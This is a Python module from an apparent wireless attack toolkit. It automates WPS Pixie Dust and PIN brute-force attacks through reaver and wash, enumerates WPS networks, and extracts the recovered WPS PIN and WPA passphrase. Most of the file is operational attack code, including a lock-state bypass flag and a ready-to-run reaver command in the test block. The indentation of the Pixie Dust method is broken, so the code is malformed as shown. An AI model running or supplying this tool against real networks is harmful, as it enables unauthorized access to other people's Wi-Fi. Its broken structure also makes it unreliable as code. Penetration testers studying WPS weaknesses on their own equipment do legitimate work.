"""
WPS Attack - Exploit WPS vulnerabilities
Implements Pixie Dust attack and PIN brute force via reaver integration
"""

import subprocess
import time
import re
from typing import Optional, List, Callable
from pathlib import Path
from datetime import datetime
from loguru import logger

from src.attacks.base_attack import BaseAttack, AttackResult
from src.attacks.wps_models import (
    WPSInfo, WPSPin, WPSResult, WPSAttempt,
    WPSAttackType, WPSLockState
)


class WPSAttack(BaseAttack):
    """
    WPS Attack implementation
    
    Uses reaver tool for actual WPS interaction
    Implements two attack modes:
    1. Pixie Dust - Fast attack exploiting weak RNG (seconds)
    2. PIN Brute Force - Try all PINs systematically (hours)
    
    Usage:
        attack = WPSAttack("wlan0mon")
        result = attack.execute(
            bssid="aa:bb:cc:dd:ee:ff",
            channel=6,
            attack_type=WPSAttackType.PIXIE_DUST
        )
    """
    
    def __init__(self, interface: str):
        """
        Initialize WPS attack
        
        Args:
            interface: Wireless interface in monitor mode
        """
        super().__init__(interface, "WPS Attack")
        
        self.reaver_path = self._find_reaver()
        self.wash_path = self._find_wash()
        
        # Attack state
        self.current_result: Optional[WPSResult] = None
        self.running = False
        
        # Callbacks
        self.on_pin_attempt: Optional[Callable] = None
        self.on_progress: Optional[Callable] = None
    
    def _find_reaver(self) -> Optional[str]:
        """Find reaver binary"""
        try:
            result = subprocess.run(
                ['which', 'reaver'],
                capture_output=True,
                text=True,
                check=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError:
            logger.warning("reaver not found - install with: sudo apt install reaver")
            return None
    
    def _find_wash(self) -> Optional[str]:
        """Find wash binary (WPS scanner)"""
        try:
            result = subprocess.run(
                ['which', 'wash'],
                capture_output=True,
                text=True,
                check=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError:
            logger.warning("wash not found")
            return None
    
    def enumerate_wps(self, timeout: int = 30) -> List[WPSInfo]:
        """
        Enumerate WPS-enabled networks
        
        Args:
            timeout: Scan duration in seconds
            
        Returns:
            List of WPSInfo objects
        """
        if not self.wash_path:
            logger.error("wash tool not found")
            return []
        
        logger.info(f"Scanning for WPS networks ({timeout}s)...")
        
        try:
            # Run wash with proper options
            cmd = [
                self.wash_path,
                '-i', self.interface,
                '-s',  # Scan mode
                '-F',  # Ignore frame checksum errors
                   # Show 5GHz networks too
            ]
            
            logger.debug(f"Running: {' '.join(cmd)}")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Let it run for timeout duration
            time.sleep(timeout)
            process.terminate()
            
            try:
                stdout, stderr = process.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
            
            # Parse output
            networks = []
            
            # Debug: print raw output
            logger.debug(f"Wash output:\n{stdout}")
            
            for line in stdout.split('\n'):
                # Skip header and empty lines
                if not line.strip() or 'BSSID' in line or '---' in line:
                    continue
                
                # Split by whitespace
                parts = line.split()
                
                # Minimum format: BSSID Ch dBm WPS Lck Vendor ESSID
                if len(parts) >= 4 and ':' in parts[0]:
                    try:
                        bssid = parts[0]
                        channel = int(parts[1]) if parts[1].isdigit() else 0
                        # Signal strength at parts[2] (e.g., "-50")
                        wps_version = parts[3] if len(parts) > 3 else None
                        locked = parts[4] if len(parts) > 4 else "No"
                        
                        
                        vendor = parts[5] if len(parts) > 5 else None
                        ssid = ' '.join(parts[6:]) if len(parts) > 6 else None
                        
                        wps_info = WPSInfo(
                            bssid=bssid,
                            channel=channel,
                            wps_locked=WPSLockState.LOCKED if locked.lower() in ['yes', 'locked'] else WPSLockState.UNLOCKED,
                            wps_version=wps_version,
                            ssid=ssid if ssid and ssid != '' else None,
                            wps_enabled=True
                        )
                        networks.append(wps_info)
                        
                    except (ValueError, IndexError) as e:
                        logger.debug(f"Failed to parse line: {line} - {e}")
                        continue
            
            logger.info(f"Found {len(networks)} WPS-enabled networks")
            return networks
            
        except Exception as e:
            logger.error(f"WPS enumeration failed: {e}")
            return []
    
    def _execute_pixie_dust(
    self,
    bssid: str,
    channel: int,
    timeout: int = 180,
    max_retries: int = 10
) -> WPSResult:
    """
    Execute Pixie Dust attack with live output like wifite
    """
    if not self.reaver_path:
        return WPSResult(
            attack_type=WPSAttackType.PIXIE_DUST,
            target_bssid=bssid,
            success=False,
            message="reaver not installed",
            error="Missing dependency"
        )
    
    logger.info(f"Attempting Pixie Dust attack on {bssid}")
    
    result = WPSResult(
        attack_type=WPSAttackType.PIXIE_DUST,
        target_bssid=bssid,
        pixie_dust_attempted=True
    )
    
    # Delete any old session files
    import os
    import glob
    session_files = glob.glob(f"/tmp/reaver/*{bssid.replace(':', '')}*")
    for f in session_files:
        try:
            os.remove(f)
            logger.debug(f"Removed old session: {f}")
        except:
            pass
    
    try:
        # Build command WITHOUT -S (causes issues), just delete sessions first
        cmd = [
            self.reaver_path,
            '-i', self.interface,
            '-b', bssid,
            '-c', str(channel),
            '-K', '1',  # Pixie Dust
            '-vv',
            '-N',
            '-L',
            '-d', '2',
            '-T', '1',
            '-r', '0:10',
            '-t', '5',  # M5 timeout
            '-x', '3'   # Pin tries before giving up
        ]
        
        logger.debug(f"Running: {' '.join(cmd)}")
        
        # Execute with pseudo-terminal to avoid prompts
        import pty
        import select
        
        master, slave = pty.openpty()
        
        process = subprocess.Popen(
            cmd,
            stdin=slave,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        os.close(slave)
        
        # Monitor with live output
        pin = None
        psk = None
        deauth_count = 0
        timeout_count = 0
        
        start_time = time.time()
        last_status = ""
        
        while True:
            if time.time() - start_time > timeout:
                process.kill()
                logger.warning(f"Timeout after {timeout}s")
                break
            
            # Use select for non-blocking read
            ready = select.select([process.stdout], [], [], 0.1)
            
            if ready[0]:
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                line = line.strip()
                
                # Print status updates live (like wifite)
                if any(x in line for x in ['Sending', 'Received', 'Trying', 'Associated']):
                    # Extract key status
                    if 'Sending EAPOL' in line:
                        status = "Sending EAPOL..."
                    elif 'Received M' in line:
                        status = f"Received {line.split('Received')[1].split()[0]}"
                    elif 'Trying pin' in line:
                        pin_try = line.split('"')[1] if '"' in line else "..."
                        status = f"Trying PIN: {pin_try}"
                    elif 'Associated with' in line:
                        status = "Associated with AP"
                    else:
                        status = line[:50]
                    
                    if status != last_status:
                        print(f"\r  {status}                    ", end='', flush=True)
                        last_status = status
                
                logger.debug(line)
                
                # Handle session prompt automatically
                if 'Restore previous session' in line:
                    try:
                        os.write(master, b'n\n')  # Answer 'no'
                        logger.debug("Auto-answered session prompt: no")
                    except:
                        pass
                
                # Track issues
                if "deauth" in line.lower():
                    deauth_count += 1
                
                if "timeout" in line.lower():
                    timeout_count += 1
                
                # Parse success
                pin_match = re.search(r'WPS PIN: [\'"]([\d]+)[\'"]', line)
                if pin_match:
                    pin = pin_match.group(1)
                    logger.success(f"Found PIN: {pin}")
                    print(f"\n  ✓ Found PIN: {pin}")
                
                psk_match = re.search(r'WPA PSK: [\'"](.*)[\'"]', line)
                if psk_match:
                    psk = psk_match.group(1)
                    logger.success(f"Found PSK: {psk}")
                    print(f"  ✓ Found PSK: {psk}")
                
                if pin and psk:
                    result.success = True
                    result.pin = pin
                    result.psk = psk
                    result.pixie_dust_success = True
                    result.message = f"Cracked! (deauths: {deauth_count})"
                    process.kill()
                    break
                
                if "Pixie Dust attack failed" in line:
                    break
        
        print()  # New line after status updates
        
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()
        
        os.close(master)
        
        if not result.success:
            result.message = f"Not vulnerable (deauths: {deauth_count}, timeouts: {timeout_count})"
        
    except Exception as e:
        logger.error(f"Pixie Dust error: {e}")
        result.error = str(e)
        result.message = f"Attack failed: {e}"
    
    result.end_time = datetime.now()
    return result
    
    def _execute_pin_bruteforce(
        self,
        bssid: str,
        channel: int,
        timeout: int = 3600,
        start_pin: Optional[str] = None
    ) -> WPSResult:
        """
        Execute PIN brute force attack
        
        Args:
            bssid: Target AP BSSID
            channel: WiFi channel
            timeout: Attack timeout (seconds)
            start_pin: PIN to start from (for resuming)
            
        Returns:
            WPSResult
        """
        if not self.reaver_path:
            return WPSResult(
                attack_type=WPSAttackType.PIN_BRUTEFORCE,
                target_bssid=bssid,
                success=False,
                message="reaver not installed"
            )
        
        logger.info(f"Starting PIN brute force on {bssid}")
        logger.info(f"This may take several hours...")
        
        result = WPSResult(
            attack_type=WPSAttackType.PIN_BRUTEFORCE,
            target_bssid=bssid
        )
        
        try:
            # Build reaver command
            cmd = [
                self.reaver_path,
                '-i', self.interface,
                '-b', bssid,
                '-c', str(channel),
                '-vv',  # Verbose
                '-L',   # Ignore locked state
                '-N',   # No NACK
                '-d', '1',  # Delay between attempts
                '-T', '0.5',  # Timeout
                '-r', '3:15'  # Retries
            ]
            
            if start_pin:
                cmd.extend(['-p', start_pin])
            
            logger.debug(f"Running: {' '.join(cmd)}")
            
            # Execute
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor
            pin = None
            psk = None
            pins_tried = 0
            
            start_time = time.time()
            
            while self.running and time.time() - start_time < timeout:
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                logger.debug(line.strip())
                
                # Track progress
                if "Trying pin" in line:
                    pins_tried += 1
                    result.total_pins_tried = pins_tried
                    
                    if self.on_progress and pins_tried % 10 == 0:
                        self.on_progress(pins_tried, 11000)  # ~11k total PINs
                
                # Parse for success
                pin_match = re.search(r'WPS PIN: [\'"]([\d]+)[\'"]', line)
                if pin_match:
                    pin = pin_match.group(1)
                    logger.success(f"Found PIN: {pin}")
                
                psk_match = re.search(r'WPA PSK: [\'"](.*)[\'"]', line)
                if psk_match:
                    psk = psk_match.group(1)
                    logger.success(f"Found PSK: {psk}")
                
                if pin and psk:
                    result.success = True
                    result.pin = pin
                    result.psk = psk
                    result.message = f"PIN found after {pins_tried} attempts"
                    process.kill()
                    break
            
            if not result.success:
                process.kill()
                result.message = f"PIN not found after {pins_tried} attempts"
            
        except Exception as e:
            logger.error(f"PIN brute force error: {e}")
            result.error = str(e)
        
        result.end_time = datetime.now()
        return result
    
    def execute(
        self,
        bssid: str,
        channel: int,
        ssid: Optional[str] = None,
        attack_type: WPSAttackType = WPSAttackType.AUTOMATIC,
        timeout: int = 60
    ) -> AttackResult:
        """
        Execute WPS attack
        
        Args:
            bssid: Target AP BSSID
            channel: WiFi channel
            ssid: AP SSID (optional)
            attack_type: Type of attack to perform
            timeout: Timeout per attack attempt
            
        Returns:
            AttackResult
        """
        self._start()
        self.running = True
        
        logger.info(f"WPS Attack:")
        logger.info(f"  Target: {bssid} ({ssid or 'Unknown'})")
        logger.info(f"  Channel: {channel}")
        logger.info(f"  Mode: {attack_type.value}")
        
        # Set channel
        try:
            subprocess.run(
                ['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
                check=True,
                capture_output=True
            )
        except Exception as e:
            self._finish(False, f"Failed to set channel: {e}")
            return self.result
        
        wps_result = None
        
        # Execute attack based on type
        if attack_type == WPSAttackType.PIXIE_DUST:
            wps_result = self._execute_pixie_dust(bssid, channel, timeout)
        
        elif attack_type == WPSAttackType.PIN_BRUTEFORCE:
            wps_result = self._execute_pin_bruteforce(bssid, channel, timeout)
        
        elif attack_type == WPSAttackType.AUTOMATIC:
            # Try Pixie Dust first (fast)
            logger.info("Step 1: Trying Pixie Dust attack...")
            wps_result = self._execute_pixie_dust(bssid, channel, 60)
            
            if not wps_result.success:
                logger.info("Step 2: Pixie Dust failed, falling back to PIN brute force...")
                wps_result = self._execute_pin_bruteforce(bssid, channel, timeout)
        
        # Prepare result
        if wps_result and wps_result.success:
            message = f"WPS cracked! PIN: {wps_result.pin}, PSK: {wps_result.psk}"
            data = wps_result.to_dict()
            self._finish(True, message, data)
        else:
            message = wps_result.message if wps_result else "WPS attack failed"
            data = wps_result.to_dict() if wps_result else {}
            self._finish(False, message, data)
        
        self.running = False
        return self.result
    
    def stop(self):
        """Stop WPS attack"""
        logger.info("Stopping WPS attack...")
        self.running = False


# Test
if __name__ == "__main__":
    logger.add("data/logs/wps_attack.log", rotation="10 MB")
    
    print("=== WPS Attack Test ===\n")
    print("⚠️  This requires:")
    print("  1. reaver installed (sudo apt install reaver)")
    print("  2. Monitor mode interface")
    print("  3. WPS-enabled network YOU OWN")
    print()
    print("Test manually with:")
    print("  sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv")
